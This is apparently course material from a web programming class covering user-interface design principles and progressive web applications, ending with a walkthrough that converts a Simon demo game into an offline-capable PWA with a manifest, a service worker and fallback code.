Size
Page title
96 px
Titles
48-20 px
Text
16 px
Secondary text
14 px
Input
16 px

These sizes are just suggestions but they serve as a good place to start. If you are using an application framework then they will have default text sizes defined. The important thing is that you are consistent with the sizing. Titles should not be one size for a particular view and a different size on another one. Inconsistency confuses the user and makes the application feel haphazardly designed.
Limiting line length
Limiting the number of characters displayed on a line makes it easier to read paragraphs of text. The browser will automatically wrap text based on the viewport width, but having a line spread across a 4K monitor that is hundreds of characters long will make your application look clunky and drive the user crazy as they try and find the start of the next line in a long paragraph.
Instead you want to specify a maximum width for your paragraphs. Usually a width of 60 to 80 characters is optimal. You can set this with the max-width property set to something like 35em. The em unit is the approximately the width of the m character in the font and so about half of an 'm' is about the average character width.
The following shows the visual and cognitive impact of different line lengths.

Internationalization
Designing a global international application requires careful consideration from the beginning. Attempting to internationalize a complex, mature application after it has a domestic presence is very difficult.
One of the most important aspects to consider is the translation of textual content and the ability of the user to select their desired language.

Successful translation also requires the text to be rendered properly. For example, several languages are read from right to left. Therefore the content, and the application itself, must be displayed in that orientation.

Likewise the format for displaying dates, times, numbers, and currency varies greatly between nationalities. This includes country specific currency symbols (¥, $, €, or ฿), the order of date fields (MM/DD/YY or DD/MM/YY), and numerical separators (1,000.50 or 1.000,50).
Iconography can also be a concern. An owl in the United States represents wisdom, but in some Asian countries it symbolizes stupidity. Icons that carry religious representations can be even more disruptive.
Proper international design requires thought across the full technology stack. If data is not properly passed, stored, and rendered at every level of the stack it will fail to properly work globally. For example, dates and times should always be stored in a format that properly represents time zones (e.g. ISO 8601) and rendered based upon the user's location. That way when users do things like global calendaring or traveling between countries their data is not corrupted.
Space
Introducing space around your application content helps to create focus and lessen the effort a user has to exert in order to interpret the presented information.

Consider the following example, where whitespace is used to create focus on the brand, imagery, and call to action.

Source: Prototypr.org
Here is another example where whitespace brings the user's attention to specific text that teases the user and leads them down to the explanatory text, followed by actions the user can take to learn more.

Source: MadeBySofa.com
Consider the same content with all of the whitespace removed. This is of course extreme, but it demonstrates the power that whitespace has.

Interaction
Making your application interactive is a powerful way to engage the user and increase retention. Interaction can be as simple as gathering and displaying the user's name or avatar, or as complex as letting the user completely drive the application based on the choices they make.
Here is an example of purchasing a car where the user can interactively see what their car will look like based upon their desires.

Source: bmw.com
Interaction makes the application come alive and invests the user in the result of their efforts.
Images
It is often said that a picture can save a thousand words. Including images in your application can convey deeper understanding, make it more visually appealing, and draw a user into the application. The following example helps the user know exactly what a product looks like and what it might look like when they use it. The contrast of colors in the image helps the product to pop and further suggest its value.

Source: Burberry.com
Avoid using images that are only used as space fillers. Display space is too limited to waste on an image that doesn't add significant value. For example, the following image dominates the display of a technical article about CORS. However, it was only chosen because it matched the color scheme of the application and the title contains the work talk in it, but two people talking trough a tin can has nothing to do with CORS. Now the user has to scroll past the distracting image to get to the content. Instead, either omit the image, or include one that serves to clarify the purpose of CORS. That way your images are visually appealing and provide information that furthers the story you are trying to tell.

Source: medium.com
Animation
Animation can help make your application come alive, but it also helps confirm choices, demonstrate progress, and focus attention.

However, too much animation can physically make your users sick. Here is an example

Source: fireart.studio
Decision fatigue
You need to consider the impact of the choices that you present to a user. Hick's Law states that the time necessary to make a decision increases logarithmically with the number of choices presented. That doesn't mean that you should not provide options to the user, but that you should limit the number of choices given at any point in time.
For example, the process of building a pizza involves many steps. First you must pick the location you want to order from, then the pizza size, cheese, meats, and veggies. Finally you need to provide payment. Each of those choices require a lot of input from the user, and so limiting the number of choices displayed at one time will help reduce decision fatigue and you will have better odds of them completing the ordering process.

Source: Papa Johns
Device aware
Modern devices allow a web application to interact in many sophisticated ways. This includes abilities such as installing to the device's desktop, determining the device's geographical location, displaying notifications, detecting the acceleration of the device, using the camera, and accessing the user's contacts. The more seamlessly the application is integrated with the device the more intuitive and useful the application will be.
The following shows an application suggesting that the user add the application to the device's home screen. This makes it so a user can access the application without having to navigate to the application's URL.

Device size and orientation
Properly reorienting and altering the functionality of the application interface based upon the size and orientation of the display is especially important on mobile devices. The following shows an application that provides a course on how to tie knots. The default view for the course shows the video on the left and an interactive transcript on the right.

When the device is rotated the application automatically orients itself and moves the interactive transcript below the video in order to maximize the available space. The user can also display the table of contents on the left or the peer chat on the right. Because the device's display is large enough to show the content, even in portrait orientation, the table of contents or chat panes can also occupy a portion of the display. This allows the instructional content to still be visible while the functionality of the other panes are utilized.

On a smaller device, such as a mobile phone, the table of contents or chat panes completely replace the content. The user can then click on the X icon to return to the instructional content. That ability to restrict the focus to a single functional purpose maximizes the use of the limited space without losing the context of the content the user is viewing.

The following website demonstrates what happens when an application fails to properly adapt to the orientation of the device. When viewed in portrait mode the application only uses a small portion of the display to show a health warning, but when rotated, the warning completely occupies the display. This creates a confusing experience where the original context of the application is obscured, and leaves the user wondering what should be done next.

Performance
📖 Suggesting reading:
Google site performance
MDN Performance
Application performance is an important aspect of your design that often gets overlooked until it is too late. Your application can be visually stunning, have intuitive navigation, and have amazing interactivity, but if it takes minutes to load or react to a user's actions, it will completely fail. Many studies have analyzed the relationship between performance and user retention. One study showed that as load times increase from one second to five seconds it causes 90% more users to bounce, or leave the application.

Source: thinkwithgoogle.com
You need to set performance goals for your application and consistently monitor how your application is doing. Generally you want your application to load in under a second. However, with modern single page web applications it can take several seconds to do the initial load. You can mitigate the appearance of a slow application by giving the impression of progress, by partially loading some content or displaying a loading animation.
The Chrome debugging tools provide a lot of help for diagnosing your application performance. The network tab will show you the size of your application files and the amount of time it takes to transfer them.

You can use the Chrome debugging Lighthouse tool to run an analysis of your application. This will give you an average performance rating based upon the initial load time, longest content paint, and time before the user can interact with the page.

Short circuit
Sometimes factors such as network latency will impact the performance of your application or make it partially unavailable. You want to consider how you can create a meaningful experience for your users even when you cannot provide full functionality. For example, your application might rely on a third party service for processing payment before they can access the application. Rather than deny the user access when the payment service is down, you could collect the payment information and attempt to process it later. In the meantime the user is allowed to continue working. If later, the payment processing fails, then you handle the problem just as if their credit card was cancelled after accepting payment.
This ability to provide an alternative path is sometimes called short circuit or fallback functionality. This removes barriers from your application that otherwise would turn away customers, and they are usually not difficult to implement. You just need to consider each functional piece of your application and provide an alternative if that functionality is not available.
Accessibility
📖 Suggesting reading: MDN Accessibility
Your application needs to appeal to a diverse population of users. This means that you need to design for users with different accessibility needs, including users with visual, physical, and auditory impairments.
You can help users with visual impairments by considering color blindness when selecting your color scheme, providing high contrast themes, and supporting screen readers. Video and audio transcripts, along with visual animation, help users that need audio assistance. Providing keyboard shortcuts and making sure input elements are accessible in the proper order will help users with different physical abilities.
Ability
Application features
Visual
High contrast themes, color selection, screen readers
Audio
Closed captions, textual alternatives, visual animation
Physical
Keyboard navigation, element ordering

Many of the accessibility tools that users employ require that your HTML is well structured and has attributes that support WAI-ARIA standards. Make sure you understand the proper use of elements and aria when you design a production application.
Legal
Like it or not, applications must consider applicable regulation and the possibility of legal action. For example, by violating GDPR Amazon was fined $887 million in 2021 for violating the privacy of its customers. In another case Domino's Pizza was found to be violating the Americans with Disabilities Act (ADA) because a blind man could not order a pizza by using a screen reader.
Central to the core of many legal codes is the concept of Personally Identifiable Information (PII). While the strict interpretation of what PII is differs by industry, it generally relates to any data that can be directly ascribed to an identifiable individual.
Every industry and local has different legal constraints. You should be aware of the major legislation that impacts your application. Here are some laws that impact applications within the jurisdiction of the United States of America.
HIPAA
The Health Insurance Portability and Accountability Act (HIPAA) stipulates the management of medical records. It includes provisions that give control to the individual with regard to access and sharing of records. Specifically it restricts how relatives, courts, and insurance companies may obtain medical records.
FERPA
The Family Educational Rights and Privacy Act (FERPA) defines how student data can be stored, shared, and accessed. FERPA defines the concept of an education record and then specifies who can view and contribute to that record.
ADA
The Americans with Disabilities Act (ADA) seeks to prohibit discrimination against individuals with diverse accessibility needs. The act was originally intended to cover physical environments, but recent case law has extended the interpretation of the law to cover electronic access.
GDPR
The General Data Protection Regulation (GDPR) impacts all applications that are used by members of the European Union. The main purpose of GDPR is to protect the privacy of users. Among other things, GDPR requires applications to get approval from the user before their data can be stored or shared. It also requires the application to provide the ability to delete all of the user's data and to be able to transfer their data to competing applications.
Walls
There are many types of walls that hinder a user's experience with an application. Some walls are caused by poor design or business decisions, and others are a result of unavoidable external pressures such as governmental regulation or security concerns.
If you can learn to recognize user experience walls then there is a good chance that you can remove them or decrease their negative impact.
Complexity
As applications mature it is common for them to grow in complexity as more and more features are introduced.
A primary cause of complexity is that software vendors uncritically adopt almost any feature that users want.
— Niklaus Wirth
The following image is from GitHub. An important action that a developer needs to do is create a Personal Access Token in order to work with repositories. However, GitHub has buried the UI for creating the token somewhere in their setting (account, user, and repository) pages. Assuming you are able to find the right setting page, you are then confronted with dozens of setting categories. After clicking through all of these options a user will wonder why such an important activity is buried so deeply in the application.

Payment
Some walls, such as receiving payment, are unavoidable for the success of the application. However, consideration should be made to move the wall to the point where it is required. Before a user hits a payment wall they should have the opportunity to see the value of what they are purchasing. Even better is if the user is able to invest significant effort and content to the application before payment is required. For example, the application may allow the user to create a limited number of documents before they have to enter payment information.

Source: sitepoint.com
Once payment is required, the process for entering payment information needs to be as effortless as possible. The best option is to have them not enter information at all, and instead use an associated credential like Apple Pay or Google Wallet to authorize payment based on the already authenticated user. Beyond that, a single text box that accepts, and authorizes, a credit card number is better than dozens of text boxes that must be completed before payment is made. You also want to remember payment information so that you don't need to repeatedly ask the user for input. This enables you to provide your application as a subscription service, or to execute single click purchases for future payments.
Application failure
Application failure is a reality that any good application design needs to address. An application that has a reputation of repeatedly presenting the user with a failure wall will have a hard time retaining users. The most basic solution to handling a failure is to present a message to the user apologizing for what went wrong. The user will be slightly less annoyed if you can explain what went wrong, provide a possible remedy, or explain the expected duration of the failure.

Alternative solutions for handling failure include providing fallback functionality, automatically notifying the user when the failure has been resolved, or providing a status page where the user can go to see what is being done about the problem.
Proactive solutions include designing an application that has multiple redundant regional deployments that automatically failover when one region experiences problems, or designing the application so that it can run offline with cached data.
Security
Security walls occur when you have to interact with the user in order to authenticate them. The security walls you present should be proportional to the value of the resource you are trying to secure. A banking application should have strong security walls that provide actual protection for the user's data. An application that gives away free kitten videos should have a minimal security wall if any.
You need to consider both the frequency and complexity of your security wall. If the user feels that the security wall is too onerous for the value that the application is providing, they will find another solution. Likewise if the user feels that there is not enough security then they will not trust you with their data.
Here is an example of an application for learning how to code. They need a user's email so that they can store course progress, but they don't even ask for a password because the email address is enough to uniquely identify the user. Authentication occurs when the user provides the security code that is emailed to the address that they provided. From then on the application remembers the email address. If the user accesses the application on a different device then the user just needs to do another once-per-device authentication.

Source: freecodecamp.com
This a much lower wall than an application that requires you to log in repeatedly every 30 minutes.

A CAPTCHA is a common way to verify that a user is a human. While this may be necessary for the success of your application, it is an example of a wall that provides no value to the user and will always lessen the application experience. This is especially true for a difficult CAPTCHA such as typing in unreadable text, or entering the number of mosquitos displayed in a jungle picture.

Legal
Legal walls usually only protect the application vendor and provide little or no value to the user. GDPR inspired cookie notifications are one example of this.

Another common example of a legal wall is an application that requires the acceptance of terms and conditions before you can use the application. You want to minimize the impact of legal walls as much as possible since they lessen the user's experience and encourage the user to question why a legal consent is required in the first place.

Progressive web application
⚠ The information provided here is meant as extended course content. It will not be covered in class or appear on any test.
📖 Deeper dive reading:
MDN PWA
web.dev PWA
The idea of creating a single application that works both on desktop and mobile devices is not a new concept. You can trace its origins to Microsoft's introduction of the XMLHttpRequest (XHR) in 1999. XHR allowed web pages to make HTTP requests directly from JavaScript. This evolved into the idea of a web application that could run on any device that supported a web browser. Steve Jobs actually championed the idea of a universal web application when he introduced the iPhone in 2007.
"you can write amazing Web 2.0 and Ajax apps that look exactly and behave exactly like apps on the iPhone. And these apps can integrate perfectly with iPhone services. And guess what? There’s no SDK that you need! You’ve got everything you need if you know how to write apps using the most modern web standards to write amazing apps for the iPhone today. So developers, we think we’ve got a very sweet story for you. You can begin building your iPhone apps today"
— Steve Jobs, (Source: 2007 MacWorld keynote)
Unfortunately for the world, Apple quickly realized the incredibly lucrative market that existed if they created a closed application space that they controlled. And so in the same year that the iPhone was released, the Apple App Store was born, and software companies were forced to pay Apple 30% of all transactions made on the iPhone.
While the tax on app store participation was unfortunate, the focus on device native applications was even worse. Native apps moved the software industry away from the idea of a universal application platform, to one where developers are forced to create completely different design, functionality, and code for each device. One for iPhone, one for Android, one for each game console, one for each TV vendor, one for the desktop, and so forth. While this is great for the employability of software engineers, it is terrible for software companies and users in general.
When companies, such as Microsoft and Google realized the negative impact that native applications were having on the industry, they began to evangelize a return to standard web technologies that would work on any device. They introduced browser APIs, defined standards, and created frameworks that made it easy to build universal web applications. This technology was eventually branded as Progressive Web Application or PWA.
Advantages of PWA
While PWA builds on the standard core of HTML, CSS, and JavaScript, along with the delivery of content and software updates over HTTP, it takes web applications to the next level, by providing the following benefits.
Works offline - Using the browser's Service Worker API, a PWA can control the caching of files locally on browser and make it so that the application can run when completely disconnected from the internet. This means that your app will still work when networks are spotty, such as while riding the subway, or when your user is rappelling down a back country slot canyon.
Fast mobile installation to home screen - A user no longer has to navigate an app store to find and download a native application. Instead they click on a single button on their device and the PWA will instantly be placed on their home screen. If the app is designed to function offline, it can incrementally cache the necessary files while the user is actually using the application.
No app store tax - As companies like Epic learned through expensive litigation, you must pay if you want to play, in the app store. App stores also use a heavy hand in the submission, approval, and update process. For those companies that are denied inclusion in the app store, there is no recourse. They simply are excluded from that marketplace. PWA technology removes the app store broker from the equation, and allows the software company to deal directly with the consumer.
Instant updates - When a PWA needs to push out security fixes, or feature updates, it does not need the app store's approval. The user is also relieved from the complicated and annoying process of keeping dozens of app store installed applications updated. Instead they software provider just update by pushing a new version into production. The next time the user accesses the application they will see the changes.
Performance - Because the PWA completely controls the level of browser caching, it can provide high levels of performance that is not dependent on network connectivity constraints. The application instantly reloads on subsequent visits and all the vital resources are already on the user's device.
Same code base for all devices - Freed from the overhead of developing and maintaining multiple platforms, software companies can now redeploy their resources to providing functionality that actually benefits the user.
Better SEO score - Starting in 2018 Google announced that mobile friendly applications, with PWAs specifically recognized, will have a significantly higher placement is Google search results. If your web application is a native app, then its content is completely excluded from search results. This means that if your application is not a PWA, then you will need to spend more on marketing in order to catch up with competitors.
Finally, PWA technology enables small software companies to successfully compete in the mobile market. According to research provided by Statista (2022), mobile devices generate almost 60% of internet traffic. Those numbers are even higher for Africa (75%) and Asia (69%).

Source: statista
With a PWA, a small software company can easily reach mobile device customers, and even provide offline web applications where network coverage is spotty or only sometimes available. This is important even for mature markets, such as the United States, where there are still significant portions of the population that do not have reliable broadband access.

Source US Census Bureau
Where PWAs don't make sense
With all of the advantages of PWAs, there are some situations where a native application is necessary.
Apple incompatibility - While much of PWA technology works fine with iOS and Safari, Apple is slow to give up their strategic economic advantages. Therefore, some technologies do not yet work as well on the iPhone as they do on other devices. For example, iOS does not support standard push notifications. Additionally, you must use Safari in order to install a PWA to the home screen when using an iPhone. Hopefully, in the near future, Apple will give in to increasing community pressure and enable a better experience for their customers by removing these inconvenient incompatibilities.
Advanced device features - A PWA can access a device's location, storage, haptic feedback, contacts, camera, battery, shortcuts, device orientation, fingerprint sensor, and even Bluetooth through browser supported APIs. However, if an application requires the use of specific device features such as the flashlight or an atmospheric pressure sensor then you might be forced to build a device native application.
Example PWAs
There are lots of examples of companies deploying PWAs. This includes brands such as Uber, Pinterest, Rakuten 24, Debenhams, Spotify, Google, BMW, Starbucks, and Flipboard.
BMW
The results for moving to PWA are impressive. For example, BMW reported the following results after moving to a PWA:
4X increase in people clicking from BMW.com to a BMW sales site
Up to 4X faster site load times
50% growth in mobile users
49% more site visits from search engines
Source - Think With Google

Spotify
Spotify decided to move to a PWA in order to avoid Apple's 30% commission. However, they soon discovered additional benefits from their PWA.
Free-to-paid conversions increased 26.6% in 2015, 46% in 2019, and 58.4% in 2021
30% increase of monthly active users
The number of desktop users rose by 45%
40% increase of average listening hours per month
UX research reported a more visually appealing, responsive, and adaptable application
When you visit Spotify on a mobile device you are immediately invited to install the PWA to your home screen.

Once added to the home screen, the PWA acts just like a native device application.

Additionally, the PWA makes it so that desktop users can install, and have a native application experience. Here is an example of Spotify installed on a MacBook. Notice the lack of the browser's interface, and the inclusion of Spotify's branding in the operating system's controls.

Steps to make a PWA
One of the best things about PWA technology is that it doesn't require a significant amount of overhead to make your application a PWA. If you have built your application using responsive design techniques (@media, viewport meta, flex, grid, ...) and you have fallback functionality when disconnected, then you only have to take two additional steps. First, you need to provide a manifest that defines the details for displaying your application. Next, you need to write some JavaScript that implements the service worker API in order to cache files for performance and offline ability.
Manifest and icons
📖 Deeper dive reading: MDN Web app manifests
A PWA manifest is a JSON file that by convention is usually named manifest.json. You link the manifest to your application by including a reference in your index.html file. When the browser sees the manifest link, it recognizes the application as a PWA.
<link rel="manifest" href="manifest.json" />

There are a lot of possible settings you can specify in the manifest. This includes properties such as the application's functional categorize (e.g. education, entertainment, travel), how to display the application (e.g. fullscreen, standalone, minimal-ui), scope (where to load the application from), icons, colors, descriptions, and screenshots for installation.
A minimal manifest might look like the following.
{
  "short_name": "Simon",
  "name": "Simon",
  "start_url": ".",
  "display": "standalone",
  "theme_color": "#000000",
  "background_color": "#ffffff",
  "icons": [
    {
      "src": "favicon.ico",
      "sizes": "64x64 32x32 24x24 16x16",
      "type": "image/x-icon"
    },
    {
      "src": "/android-chrome-512x512.png",
      "sizes": "512x512",
      "type": "image/png"
    },
    {
      "src": "/maskable_icon.png",
      "sizes": "192x192",
      "type": "image/png",
      "purpose": "any maskable"
    }
  ]
}

This manifest specifies some basic branding information that tells the browser how to display the application when creating a home screen icon, and what splash screen to generate as the application starts up.
The icons section contains a variety of icons that the device will select from depending upon the context that the application is used in. In order to get full support for icons on iOS devices you also need to include a apple-touch-icon link in your index.html.
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />

Service workers
📖 Deeper dive reading: MDN Service worker API
The final step for converting your application into a progressive web application involves creating a service working by using the Service Worker API. Services workers, while not specific to PWAs, allow a web application to do background processing that is not directly associated with the rendering and interaction of a web application. One of the most common uses for a Service Worker is to enabling the browser caching of files for performance reasons. This also makes it so that the PWA keeps working even when it is disconnected from the internet.
To register a service worker, you call the navigator.serviceWorker API with the URL to a JavaScript file containing your service worker code.
navigator.serviceWorker.register('service-worker.js');

The browser will then load and execute the service worker JavaScript. This gives the service worker a chance to register for event handling and specify what files the browser should cache for the application.
You can view the state of your application's service worker using the Chrome dev tools and selecting the Application tab.

The Application tab allows you to remove the service worker, install a new version, generate events, and view cached files.
The service worker lifecycle
When a service worker is first registered, the browser will immediately load it. This causes your application to be cached on the browser so that it can run offline and not have to load over the network on the user's next use. Since the application is served from the browser's cache, a user will not immediately see new application versions as they are deployed. Instead, they are loaded and put in a waiting state. The service worker remains in the waiting state until all of the browser tabs displaying the application are closed. Then, the next time the user opens the application, they will experience the new version.
You can use the Service Worker settings on the Application dev tools tab to skip the waiting period and force the new application version to load immediately.
Your application can also detect that a new version is available and then ask the user if they would like to automatically upgrade to the new version. The browser does that by simply refreshing the browser window.
Experimenting with PWA
If you would like to see a simple PWA in action, you can use create-react-app to generate an template PWA application. From your console window run:
npx create-react-app testpwa --template cra-template-pwa

Then open the resulting project found in the testpwa directory and modify index.js to change serviceWorkerRegistration.unregister to serviceWorkerRegistration.register. Then build the application with npm run build and host the resulting bundled app located in the build directory with the VS Code Live Server extension in order to see a minimal working PWA.
Workbox
📖 Deeper dive reading: Chrome workbox
Workbox is an NPM package created by Google for using services workers. The template PWA created create-react-app, and the Simon demonstration project, both use workbox to simplify some of the registration, routing, and caching service worker complexities.

Simon Progressive Web Application
⚠ Note that this deliverable is optional and ungraded. The information provided here is meant as extended course content.

This deliverable demonstrates using Progressive Web Application (PWA) technology to integrate with mobile devices.
To covert the last Simon deliverable to a PWA we need to make three modifications.
Update the manifest and icons.
Implement and register a service worker. This includes caching the files necessary to run offline.
Implement fallback functionality so the application still works when offline.
Manifest and icons
We want to make sure that Simon has all the necessary icons required by all major devices. To do this we took the original Simon icon and used Favicon.io to create a complete set of icons. We also created a maskable icon using Maskable.app for devices that manipulate your icon for display with different shapes and sizes. These icons were then added to the /public directory, and references were added to both the index.html link elements and the manifest.json file.
index.html
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />

manifest.json
{
  "short_name": "Simon",
  "name": "Simon",
  "start_url": ".",
  "display": "standalone",
  "theme_color": "#000000",
  "background_color": "#ffffff",
  "icons": [
    {
      "src": "favicon.ico",
      "sizes": "64x64 32x32 24x24 16x16",
      "type": "image/x-icon"
    },
    {
      "src": "/android-chrome-192x192.png",
      "sizes": "192x192",
      "type": "image/png"
    },
    {
      "src": "/android-chrome-512x512.png",
      "sizes": "512x512",
      "type": "image/png"
    },
    {
      "src": "/maskable_icon.png",
      "sizes": "192x192",
      "type": "image/png",
      "purpose": "any maskable"
    }
  ]
}

Service worker
In order to get a reasonable service worker implementation we ran create-react-app with the cra-template-pwa template, and then copied over the service-worker.js and serviceWorkerRegistration.js files to our Simon project. The registration and service worker code was then stripped down and the necessary Workbox NPM packages installed as follows.
npm install workbox-core workbox-expiration workbox-precaching workbox-routing workbox-strategies

The caching implemented in service-worker.js first caches the React generated files, and then explicitly caches the sound and icon files used by Simon. This makes it so that all application files are cached on the browser and available for offline use.
The service worker was then set to register with the browser by calling the register function at the end of the index.jsx file.
serviceWorkerRegistration.register();

Offline fallbacks
Previous deliverables of Simon actually implemented fallback functionality for storing the current user and highest scores. However, we needed to make it so that a previously authenticated user could still play when disconnected from the internet. We also needed a default quote to use if we couldn't reach the third party quote endpoint.
Authentication
To support remembering the previously authenticated user we removed the code found in app.jsx that tried to verify authentication on start up. Instead we simply use the presence of a user name in local storage to designate authentication.
When then modified authenticated.jsx to remove the user name from local storage when a user logs out.
function logout() {
  fetch(`/api/auth/logout`, {
    method: 'delete',
  }).then(() => {
    localStorage.removeItem('userName');
    props.onLogout();
  });
}

The server will still check to make sure we have an authenticated user when an attempt to update the latest high score, but these changes make it so you can still play Simon when disconnected if you were previously authenticated.
Finally we disable login and account creation if we are not connected, and display an error instead.
async function loginOrCreate(endpoint) {
  try {
    const response = await fetch(endpoint, {
      method: 'post',
      //...
    });
    //...
  } catch {
    setDisplayError(
      `⚠ It appears that you are currently offline. You can play Simon offline, but you must be initially online to create or login to your account.`
    );
  }
}


Default quote
In about.jsx we return a default quote if we cannot connect to the third party quote endpoint.
fetch('https://api.quotable.io/random')
  .then((response) => response.json())
  .then((data) => {
    this.setState({ quote: data.content, quoteAuthor: data.author });
  })
  .catch(() => {
    // Use offline fallback classic quote
    this.setState({
      quote: `Always bet on JavaScript`,
      quoteAuthor: `Brendan Eich`,
    });
  });

These changes, combined with the browser caching of all the Simon files, makes the application work reasonably when offline.
Deployment and testing
During your examination of serviceWorkerRegistration.js you might have noticed that it does not register the service worker unless the application has been built in production mode (e.g. with npm run build). That means we need to run a production version of the application in order to see if everything is working correctly. The easiest way to do this is to use deployReact.sh to push the application to production.
Once you have the application in production you can use the Chrome debug tools to see that the application is registered and running without error. You can turn off the network for the application by selecting the Offline option. You can also see all the files that are cached in the Cache/Storage/Cached Storage view. To delete the service worker and all cached files associated with the application use the Application/Storage/Clear Site Data option.

When you are confident about how the PWA is working you can run the Lighthouse tool found in the Chrome Dev Tools and see if everything is working up to specification. If it displays all green then your application should work well on all devices and should be properly search engine optimized (SEOed)).
Lighthouse report

Device testing
As a final test you should manually examine the application using the different responsive views that the Dev Tools provide with the Chrome, Safari, and Firefox browsers. Here is what Simon looks like on the Safari browser emulating an iPhone 6. As you can see it is not rendering properly on a small screen.

Study this code
Get familiar with what the example code teaches.
Clone the repository to your development environment.
git clone https://github.com/webprogramming260/simon-pwa.git


Set up your Atlas credentials in a file named dbConfig.json that is in the same directory as database.js.
Add dbConfig.json to your .gitignore file so that it doesn't put your credentials into GitHub accidentally.
Review the code and get comfortable with everything it represents.
View the code in your browser by hosting it from a VS Code debug session. ⚠ Do not use the live server extension since your frontend code will now be served up by the Node.js server you created in index.js. Set breakpoints in your backend code inside of Visual Studio.
Make modifications to the code as desired. Experiment and see what happens.

